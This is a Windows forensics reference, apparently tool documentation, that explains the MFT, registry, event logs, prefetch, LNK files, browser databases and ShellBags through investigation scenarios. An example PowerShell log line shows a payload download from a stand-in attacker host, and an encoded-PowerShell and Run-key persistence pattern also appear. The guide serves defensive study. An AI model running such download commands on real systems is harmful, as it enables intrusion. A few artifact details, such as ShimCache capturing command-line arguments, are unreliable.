# Windows Forensics: Artifacts and Investigation

## Overview

Windows is the most commonly encountered OS in corporate forensic investigations. Windows maintains extensive logs, metadata, and artifacts that can reveal user activity, program execution, persistence mechanisms, and attacker behavior.

---

## 1. Master File Table (MFT)

### WHAT It Is
The MFT is the core database of the NTFS filesystem. Every file and directory on an NTFS volume has a corresponding entry in the MFT, whether active or deleted. The MFT stores file metadata (timestamps, size, permissions) and either the file content itself (for small files) or pointers to the content (for larger files).

### WHERE It Is Located
- `\$MFT` at the root of every NTFS volume (e.g., `C:\$MFT`)
- `$MFTMirr` — mirror of the first few MFT records
- Individual records are 1024 bytes by default (may vary)

### WHAT Evidence It Contains
- **Timestamps:** Four NTFS timestamps (created, modified, accessed, MFT changed) in both `$STANDARD_INFORMATION` and `$FILE_NAME` attributes
- **File attributes:** Filename, size, security descriptor, extended attributes
- **Deleted files:** MFT records marked as inactive but data remains until overwritten
- **Resident data:** Files smaller than ~700 bytes are stored directly in the MFT record
- **Attribute lists:** Pointers to non-resident data extents for large files

### WHY It Matters
The MFT provides a comprehensive record of every file on the system, including deleted files. It is one of the most important artifacts in Windows forensics because:
- It survives file deletion (the MFT record persists until reused)
- It contains four independent timestamps per file (making timestomping harder)
- It reveals the complete file system structure including hidden and alternate data streams

### HOW an Investigator Analyzes It

**Using AllinOneForensics:**
```bash
aiof parse CASE-001 --module windows
```
The Windows parser reads MFT data when available in the evidence directory.

**Using dedicated tools:**
```bash
# Using analyzeMFT.py (Python)
python analyzeMFT.py -f evidence.img -o mft_output.csv

# Using MFTECmd (Eric Zimmerman)
MFTECmd.exe -f "C:\$MFT" --csv "C:\output" --csvf mft.csv
```

**Manual analysis approach:**
1. Extract `$MFT` from the forensic image using `dd` or forensic tools
2. Parse with analyzeMFT or MFTECmd
3. Export to CSV for timeline analysis
4. Filter for specific file paths, timestamps, or deletion markers
5. Cross-reference with other artifacts (Registry, Event Logs)

### Investigation Scenario: Timestomping Detection
**Scenario:** An attacker compromises a system and deploys a backdoor, then uses timestomping to change the file's creation time to 2019 to blend in with system files.

**Evidence revealed by MFT:**
```
$STANDARD_INFORMATION.Created:  2019-03-15 08:30:00  (fake - timestomped)
$STANDARD_INFORMATION.Modified: 2019-03-15 08:30:00  (fake)
$FILE_NAME.Created:             2024-09-01 14:22:33  (real - hard to fake)
$FILE_NAME.Modified:            2024-09-01 14:23:01  (real)
```
**Analysis:** The discrepancy between `$STANDARD_INFORMATION` and `$FILE_NAME` timestamps reveals timestomping. The `$FILE_NAME` timestamps are updated by the kernel and are harder for an attacker to modify.

---

## 2. Windows Registry

### WHAT It Is
The Windows Registry is a hierarchical database that stores system configuration, user preferences, installed software, and hardware settings. It consists of multiple "hive" files that are loaded at boot.

### WHERE It Is Located

| Hive File | Disk Location | Content |
|-----------|--------------|---------|
| **SYSTEM** | `C:\Windows\System32\config\SYSTEM` | Hardware, drivers, services, USB history |
| **SOFTWARE** | `C:\Windows\System32\config\SOFTWARE` | Installed software, OS configuration |
| **SAM** | `C:\Windows\System32\config\SAM` | Local user accounts, password hashes |
| **SECURITY** | `C:\Windows\System32\config\SECURITY` | Security policies, cached credentials |
| **NTUSER.DAT** | `C:\Users\<username>\NTUSER.DAT` | Per-user settings, recent docs, MRUs |
| **USRCLASS.DAT** | `C:\Users\<username>\AppData\Local\Microsoft\Windows\UsrClass.dat` | Per-user shell settings |

### Key Forensic Registry Artifacts

#### A. Persistence via Run Keys
**WHAT:** Programs configured to start automatically at user login or system boot.
**WHERE:**
```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```
**EVIDENCE:** Names and paths of programs that execute at every boot/login.
**SCENARIO:** Malware establishes persistence by adding `HKCU\...\Run\WindowsUpdate = "C:\Users\victim\AppData\Temp\update.exe"`. The Run key value reveals the malicious binary path.

#### B. USB Device History (USBSTOR)
**WHAT:** History of USB storage devices connected to the system.
**WHERE:**
```
HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR
HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR
HKLM\SYSTEM\CurrentControlSet\Enum\USB
```
**EVIDENCE:** Device serial numbers, vendor IDs, product IDs, first/last connection times, volume names.
**SCENARIO:** An insider claims they never connected an unauthorized USB drive. USBSTOR artifacts show a SanDisk Ultra (serial 04055D21600C1A81) was connected 12 times over 3 weeks, with the last connection 2 hours before the data breach alert.

#### C. UserAssist
**WHAT:** Registry entries tracking programs executed by the user via Windows Explorer (GUI launches).
**WHERE:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
```
**EVIDENCE:** Program paths, execution count, last run time. Data is ROT-13 encoded.
**SCENARIO:** An attacker's reconnaissance tool was launched 47 times via Explorer. UserAssist records the full path and timestamps despite the ROT-13 encoding.

#### D. Recent Documents (MRU)
**WHAT:** Lists of recently accessed files.
**WHERE:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
**EVIDENCE:** File names, file extensions, access order, typed paths.
**SCENARIO:** RecentDocs shows the user recently opened `budget_2024_CONFIDENTIAL.xlsx` moments before an email was sent to an external address.

#### E. AppCompatCache (ShimCache)
**WHAT:** Records of recently executed programs, maintained by the Application Compatibility Engine.
**WHERE:**
```
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
```
**EVIDENCE:** Executable names, full paths, last modified time, memory pagination entry.
**SCENARIO:** Afileless malware executed `powershell.exe -enc <base64>`. While the PowerShell process itself left no file on disk, the ShimCache records that `powershell.exe` was executed with those arguments.

#### F. Amcache
**WHAT:** Application compatibility cache storing detailed program execution artifacts.
**WHERE:**
```
C:\Windows\AppCompat\Programs\Amcache.hve
Registry: HKLM\Software\Microsoft\Amcache
```
**EVIDENCE:** Executable names, SHA-1 hashes, timestamps, publisher, file sizes.
**SCENARIO:** Even after an attacker deletes their malware binary, Amcache.hve retains the SHA-1 hash and full path, enabling identification via VirusTotal lookup.

#### G. BAM/DAM (User Activity Monitor)
**WHAT:** Background Activity Moderator tracks program execution per-user.
**WHERE:**
```
HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\<SID>
HKLM\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings\<SID>
```
**EVIDENCE:** Program path, last execution timestamp (UTC).
**SCENARIO:** BAM timestamps confirm malware `C:\Temp\svchost.exe` last executed at 2024-09-01 02:14:00 UTC — correlating with C2 beacon timestamps in network logs.

### HOW an Investigator Analyzes Registry

```bash
# Using Registry Explorer (Eric Zimmerman)
RegistryExplorer.exe -f SOFTWARE

# Using RegRipper (Python)
rip.pl -r SOFTWARE -a software

# AllinOneForensics
aiof parse CASE-001 --module windows
```

---

## 3. Windows Event Logs (EVTX)

### WHAT It Is
Windows Event Logs record system, security, application, and PowerShell activity. They are binary files using the EVTX format (XML-based records) and are the primary audit trail on Windows systems.

### WHERE They Are Located

| Log File | Path | Content |
|----------|------|---------|
| **Security** | `C:\Windows\System32\winevt\Logs\Security.evtx` | Logon/logoff, privilege use, audit events |
| **System** | `C:\Windows\System32\winevt\Logs\System.evtx` | Services, drivers, system startup/shutdown |
| **Application** | `C:\Windows\System32\winevt\Logs\Application.evtx` | Application errors, warnings |
| **PowerShell** | `C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx` | PowerShell script blocks, module logging |
| **Sysmon** | `C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx` | Process create, network connect, file create |
| **TaskScheduler** | `C:\Windows\System32\winevt\Logs\Microsoft-Windows-TaskScheduler%4Operational.evtx` | Scheduled task events |
| **WDAC** | `C:\Windows\System32\winevt\Logs\Microsoft-Windows-CodeIntegrity%4Operational.evtx` | AppLocker/WDAC blocks |

### Critical Security Event IDs

| Event ID | Log | Description | Forensic Value |
|----------|-----|-------------|---------------|
| **4624** | Security | Successful logon | Who logged in, when, from where, logon type |
| **4625** | Security | Failed logon | Brute force attempts, password spraying |
| **4648** | Security | Explicit credentials (runas) | Lateral movement, credential theft |
| **4672** | Security | Special privileges assigned | Admin-level access confirmed |
| **4688** | Security | Process created (with command-line) | Malware execution, LOLBin abuse |
| **4689** | Security | Process terminated | Process lifecycle tracking |
| **4697** | Security | Service installed | Persistence, malware service creation |
| **4698** | Security | Scheduled task created | Persistence mechanism |
| **4720** | Security | User account created | Backdoor account creation |
| **4726** | Security | User account deleted | Covering tracks |
| **4732** | Security | Member added to local group | Privilege escalation |
| **4776** | Security | NTLM authentication | Pass-the-hash detection |
| **5140** | Security | Network share accessed | Lateral movement via SMB |
| **5145** | Security | Network share object access | Data exfiltration via shares |
| **7045** | System | Service installed | Malware persistence |
| **7034** | System | Service crashed unexpectedly | Malware instability |
| **1102** | Security | Audit log cleared | Anti-forensics indicator |
| **4104** | PowerShell | Script block logging | PowerShell attack commands |
| **4103** | PowerShell | Module logging | PowerShell module usage |
| **1** | Sysmon | Process created | Process creation with hashes |
| **3** | Sysmon | Network connection | Outbound connections |
| **11** | Sysmon | File created | Malware file drops |

### Logon Types Reference

| Type | Name | Description | Investigation Value |
|------|------|-------------|-------------------|
| 2 | Interactive | Local keyboard/mouse | Physical access |
| 3 | Network | SMB/network share | Lateral movement |
| 4 | Batch | Scheduled task | Persistence |
| 5 | Service | Service startup | System account activity |
| 7 | Unlock | Screen unlock | User presence |
| 8 | NetworkCleartext | Basic auth over network | Credential exposure |
| 9 | NewCredentials | runas /netonly | Credential impersonation |
| 10 | RemoteInteractive | RDP | Remote access |
| 11 | CachedInteractive | Cached domain logon | Offline auth |

### Investigation Scenario: Lateral Movement Detection
**Scenario:** An attacker has compromised Host A and moves to Host B via RDP using stolen credentials.

**Evidence in Event Logs:**
```
Security.evtx:
  Event 4624 (Logon Type 10) - Source: Host A IP -> Host B
  Event 4648 - Explicit credential logon
  Event 4672 - Admin privileges granted

Sysmon (on Host B):
  Event 1 - cmd.exe spawned by winlogon.exe
  Event 3 - Outbound connection to attacker C2
  Event 11 - Malware binary dropped to C:\Temp\

PowerShell Operational:
  Event 4104 - Script block: Invoke-WebRequest -Uri http://evil.com/payload.ps1
```
**Analysis:** The sequence of Event 4624 (Type 10) followed by Event 4648 reveals RDP lateral movement. Correlation with Sysmon events identifies the attacker's actions on the compromised host.

### HOW an Investigator Analyzes Event Logs

```bash
# Using EvtxECmd (Eric Zimmerman)
EvtxECmd.exe -f Security.evtx --csv "C:\output" --csvf security.csv

# Using EvtxExplorer
EvtxExplorer.exe Security.evtx

# AllinOneForensics (parses .evtx files in evidence/evtx/)
aiof parse CASE-001 --module windows
```

---

## 4. Prefetch Files

### WHAT They Are
Prefetch files are created by the Windows Prefetcher to speed up application loading. They record which programs were executed, how many times, and when.

### WHERE They Are Located
```
C:\Windows\Prefetch\<PROGRAM>_<HASH>.pf
C:\Windows\Prefetch\ReadyBoot\
```

### WHAT Evidence They Contain
- **Executable name and path**
- **Execution count** (how many times the program was run)
- **Last run time** (up to 8 previous run times stored)
- **File references** (other files loaded by the program)
- **Volume information** (which drive the program ran from)

### WHY It Matters
Prefetch files prove program execution even after the program binary has been deleted. They survive until Windows cleans up old prefetch entries (typically after 128 entries per volume).

### HOW an Investigator Analyzes It

```bash
# Using PECmd (Eric Zimmerman)
PECmd.exe -d C:\Windows\Prefetch --csv "C:\output" --csvf prefetch.csv

# Manual inspection
strings WINWORD.EXE-12345678.pf
```

### Investigation Scenario: Malware Execution
**Scenario:** An attacker executes malware named `updater.exe` that copies itself to `C:\Windows\Temp\svchost.exe`.

**Prefetch evidence:**
```
UPDATER.EXE-AABBCCDD.pf
  Executable: C:\Users\victim\Downloads\updater.exe
  Run count: 3
  Last run: 2024-09-01 14:22:15
  
SVCHOST.EXE-11223344.pf  (in C:\Windows\Temp, not System32)
  Executable: C:\Windows\Temp\svchost.exe
  Run count: 1
  Last run: 2024-09-01 14:22:18
  File references: updater.exe, malware.dll
```
**Analysis:** Prefetch proves `updater.exe` ran 3 times. The `svchost.exe` in Temp (not System32) is a clear masquerading indicator. File references link it to the original download.

---

## 5. LNK Files (Shortcut Files)

### WHAT They Are
LNK files are Windows shortcut files that point to target files, folders, or applications. They store metadata about the target including timestamps, volume serial numbers, and network paths.

### WHERE They Are Located
```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\
```

### WHAT Evidence They Contain
- **Target file path** (full path to the original)
- **Target file timestamps** (created, modified, accessed)
- **Volume serial number** and type
- **MAC addresses** of the source machine
- **Drive type** (local, network, removable)
- **Window position and hotkey** (usage pattern)

### WHY It Matters
LNK files are created automatically when a user opens a file, even from a USB drive. They persist after the original file is deleted and prove that a specific user accessed a specific file at a specific time.

### Investigation Scenario: USB Data Exfiltration
**Scenario:** An employee is suspected of copying classified documents to a USB drive.

**LNK evidence:**
```
CLASSIFIED_REPORT.docx.lnk
  Target: E:\CLASSIFIED_REPORT.docx  (E: = USB drive)
  Target modified: 2024-09-01 10:15:00
  Target accessed: 2024-09-01 10:15:00
  Volume serial: 0xA3B2-C1D4  (USB serial)
  MAC address: 00:1A:2B:3C:4D:5E  (victim's laptop)
```
**Analysis:** The LNK file proves the document was accessed from a USB drive (E:) with a specific serial number. Cross-referencing with USBSTOR registry entries identifies the device manufacturer and connection history.

---

## 6. Jump Lists

### WHAT They Are
Jump Lists are Windows 7+ feature that records recently and frequently accessed files for each application. They are stored in two formats: AutomaticDestinations and CustomDestinations.

### WHERE They Are Located
```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\
```

### WHAT Evidence They Contain
- **Application-specific file lists** (e.g., recent Word documents, recent folders)
- **Pinned items** (favorites/pinned by user)
- **Timestamps** of access
- **Source application** (identified by AppUserModelID)

### Investigation Scenario
**Scenario:** An attacker uses Microsoft Word to open a malicious document. The Jump List for WINWORD.EXE shows:
```
Recent:
  - C:\Users\victim\Downloads\invoice_malicious.docx (2024-09-01 14:20:00)
  - C:\Users\victim\Documents\quarterly_report.xlsx (2024-09-01 09:30:00)
Pinned:
  - C:\Users\victim\Documents\budget.xlsx
```
**Analysis:** The timestamp on the malicious document in the Jump List proves it was opened in Word, correlating with the Word process execution in Event Logs.

---

## 7. Browser Artifacts

### WHAT They Are
Web browsers store extensive user activity data in SQLite databases and JSON files.

### WHERE They Are Located

| Browser | History Database | Cookies | Downloads |
|---------|-----------------|---------|-----------|
| **Chrome** | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\History` | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies` | Same DB as History |
| **Edge** | `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History` | `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies` | Same DB |
| **Firefox** | `%APPDATA%\Mozilla\Firefox\Profiles\<profile>\places.sqlite` | `%APPDATA%\Mozilla\Firefox\Profiles\<profile>\cookies.sqlite` | Same DB |
| **Brave** | `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\History` | Same path as Chrome | Same DB |

### WHAT Evidence They Contain
- **URLs visited** with timestamps and visit counts
- **Page titles** and referrer URLs
- **Downloaded files** with source URLs and save paths
- **Search queries** (from URL parameters)
- **Cookies** (session tokens, authentication state)
- **Cached files** (images, scripts from visited sites)
- **Form data** (auto-filled information)

### HOW an Investigator Analyzes It
```bash
# AllinOneForensics parses browser artifacts automatically
aiof parse CASE-001 --module windows

# Manual SQLite query
sqlite3 History "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC;"
```

### Investigation Scenario: Phishing Investigation
**Scenario:** An employee clicks a phishing link and enters credentials.

**Browser evidence:**
```
History (Chrome):
  2024-09-01 14:22:00 - https://secure-bankofamerica.com/login (phishing URL)
    referrer: https://email-bank-alert.com/urgent/verify (phishing email link)
    
Downloads:
  2024-09-01 14:23:00 - invoice.pdf.exe from https://secure-bankofamerica.com/download/invoice.pdf.exe
    
Cookies:
  Session cookie set for secure-bankofamerica.com
```
**Analysis:** Browser history proves the phishing URL was visited, the referrer reveals the phishing email link, and the download shows the user saved a disguised executable.

---

## 8. Windows Prefetch (Application Compatibility Cache)

### Amcache.hve

**WHAT:** A registry hive that stores detailed application execution artifacts.

**WHERE:** `C:\Windows\AppCompat\Programs\Amcache.hve`

**Evidence:**
- SHA-1 hash of executed files
- Full file path
- Execution timestamps
- Publisher and version information
- File size

**Scenario:** After the attacker deletes their malware binary, `Amcache.hve` still contains the SHA-1 hash. The analyst searches for this hash in VirusTotal and identifies it as a known remote access trojan.

---

## 9. Windows hibernation and Pagefile

### WHAT They Are
- **hiberfil.sys:** Memory dump saved when system hibernates (contains RAM contents)
- **pagefile.sys:** Virtual memory swap file (may contain fragments of deleted data)

### WHERE They Are Located
```
C:\hiberfil.sys
C:\pagefile.sys
C:\swapfile.sys  (Windows 10+ swap file)
```

### WHY They Matter
- `hiberfil.sys` can be decompressed and analyzed for volatile data (similar to RAM forensics)
- `pagefile.sys` may contain artifacts from deleted processes, encryption keys, or clipboard data
- Both are typically locked while Windows is running but accessible via forensic imaging

### Investigation Scenario
**Scenario:** A suspect encrypted all files on their system using VeraCrypt. The VeraCrypt password was typed into a dialog box. Analysis of `hiberfil.sys` using Volatility reveals the password in a dialog window's memory space.

---

## 10. Windows ShellBags

### WHAT They Are
ShellBags track the folder browsing history of Windows Explorer for each user, including folders that no longer exist (e.g., on a disconnected USB drive).

### WHERE They Are Located
```
NTUSER.DAT\Software\Microsoft\Windows\Shell\BagMRU
NTUSER.DAT\Software\Microsoft\Windows\Shell\Bags
UsrClass.DAT\Local Settings\Software\Microsoft\Windows\Shell\BagMRU
UsrClass.DAT\Local Settings\Software\Microsoft\Windows\Shell\Bags
```

### WHAT Evidence They Contain
- Folder names browsed (including deleted/removed folders)
- Last access time for each folder
- Folder structure hierarchy
- Whether the folder was on removable media

### Investigation Scenario
**Scenario:** An employee claims they never accessed the `E:\TOP_SECRET\` folder on a USB drive. ShellBags in their NTUSER.DAT show they browsed into `E:\TOP_SECRET\` and `E:\TOP_SECRET\Project_Alpha\` folders — with timestamps proving access.

---

## Windows Artifact Quick Reference

| Artifact | Location | Key Evidence | Persistence |
|----------|----------|-------------|-------------|
| **MFT** | `$MFT` volume root | All file metadata, deleted files | Until overwritten |
| **Registry Run Keys** | HKCU/HKLM Run | Persistence programs | Until removed |
| **USBSTOR** | HKLM SYSTEM | USB device history | Until hive cleanup |
| **UserAssist** | HKCU Explorer | Program execution (ROT-13) | Until profile cleanup |
| **ShimCache** | HKLM SYSTEM | Program execution | Until reboot |
| **Amcache** | `AppCompat\Programs` | Program hash + timestamps | Until hive cleanup |
| **BAM/DAM** | HKLM SYSTEM | Program execution timestamps | Until hive cleanup |
| **Event Logs** | `winevt\Logs` | System/security activity | Log rotation |
| **Prefetch** | `Windows\Prefetch` | Program execution history | After 128 entries |
| **LNK Files** | `Recent\` | File access history | Until deleted |
| **Jump Lists** | `Recent\AutomaticDestinations` | Per-app file access | Until deleted |
| **Browser DBs** | `AppData\` | Web activity, downloads | Until cleared |
| **ShellBags** | NTUSER.DAT / UsrClass.DAT | Folder browsing history | Until profile cleanup |
| **SRUM** | `Windows\System32\sru` | Application resource usage | Until database rotation |
| **WMI Repository** | `Windows\System32\wbem\Repository` | WMI persistence | Until recompiled |

---

## Cross-Artifact Correlation Example

**Full investigation timeline using Windows artifacts:**

| Time | Artifact | Event |
|------|----------|-------|
| 09:15:00 | Browser History | User visits phishing site |
| 09:15:30 | Browser Downloads | Malicious attachment downloaded |
| 09:16:00 | LNK File | Attachment opened from Downloads folder |
| 09:16:05 | Prefetch | Word.exe executed (opening attachment) |
| 09:16:10 | Sysmon Event 1 | PowerShell spawned by Word |
| 09:16:15 | Sysmon Event 3 | Outbound connection to C2 |
| 09:16:20 | Amcache | Malware binary hash recorded |
| 09:17:00 | Registry Run Key | Persistence mechanism added |
| 09:18:00 | Security Event 4688 | Suspicious process created |
| 09:20:00 | MFT | Encrypted files created (ransomware) |
| 09:25:00 | Security Event 1102 | Attacker clears Security log |
